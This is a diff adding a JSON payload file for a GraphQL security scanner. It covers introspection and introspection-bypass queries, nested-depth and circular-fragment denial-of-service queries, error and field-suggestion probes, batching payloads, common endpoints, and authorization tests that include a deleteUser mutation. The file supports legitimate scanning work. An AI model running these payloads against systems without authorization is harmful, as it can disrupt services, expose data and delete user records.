@@ -1,0 +1,96 @@
+{
+  "metadata": {
+    "name": "GraphQL Payloads",
+    "version": "1.0.0",
+    "description": "GraphQL testing payloads for REVUEX GraphQL Scanner GOLD",
+    "author": "REVUEX Team"
+  },
+  "introspection_queries": {
+    "basic": "query { __schema { types { name } } }",
+    "full": "query { __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind } } } } }",
+    "typename": "query { __typename }",
+    "type_info": "query { __type(name: \"User\") { name fields { name type { name } } } }"
+  },
+  "depth_queries": {
+    "simple": "query { __typename { __typename { __typename { name } } } }",
+    "nested": "query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }",
+    "fragment_depth": "query { ...A } fragment A on Query { ...B } fragment B on Query { __typename }"
+  },
+  "dos_queries": {
+    "alias_abuse": "query { a1: __typename a2: __typename a3: __typename a4: __typename a5: __typename }",
+    "field_duplication": "query { user { id id id id id id id id id id } }",
+    "circular_fragments": "query { ...A } fragment A on Query { ...B } fragment B on Query { ...A }"
+  },
+  "error_triggers": {
+    "invalid_field": "query { nonExistentField }",
+    "invalid_type": "query { __type(name: \"InvalidType\") { name } }",
+    "syntax_error": "query { user { ",
+    "invalid_variable": "query($x: InvalidType!) { user(id: $x) { id } }"
+  },
+  "batching_payloads": {
+    "simple_batch": [
+      {"query": "query A { __typename }"},
+      {"query": "query B { __typename }"}
+    ],
+    "introspection_batch": [
+      {"query": "{ __schema { types { name } } }"},
+      {"query": "{ __schema { queryType { name } } }"}
+    ]
+  },
+  "field_suggestions": {
+    "password_typo": "query { user { passwor } }",
+    "email_typo": "query { user { emal } }",
+    "id_typo": "query { user { i } }"
+  },
+  "common_endpoints": [
+    "/graphql",
+    "/api/graphql",
+    "/v1/graphql",
+    "/api/v1/graphql",
+    "/query",
+    "/gql",
+    "/graphiql",
+    "/playground",
+    "/api/gql"
+  ],
+  "common_mutations": {
+    "description": "Common sensitive mutations to check",
+    "mutations": [
+      "createUser",
+      "updateUser",
+      "deleteUser",
+      "changePassword",
+      "updateEmail",
+      "createAdmin",
+      "deleteAccount",
+      "transferFunds"
+    ]
+  },
+  "bypass_techniques": {
+    "method_confusion": {
+      "description": "Try different HTTP methods",
+      "methods": ["GET", "POST", "PUT"]
+    },
+    "content_type_confusion": {
+      "description": "Try different content types",
+      "types": ["application/json", "text/plain", "application/x-www-form-urlencoded"]
+    },
+    "case_variation": {
+      "description": "Introspection case variations",
+      "queries": [
+        "{ __SCHEMA { types { name } } }",
+        "{ __Schema { types { name } } }",
+        "{ __schema { TYPES { NAME } } }"
+      ]
+    }
+  },
+  "authorization_tests": {
+    "description": "Queries to test authorization",
+    "queries": [
+      "query { users { id email role } }",
+      "query { admin { id permissions } }",
+      "query { me { id } }",
+      "mutation { deleteUser(id: \"1\") { success } }"
+    ]
+  }
+}
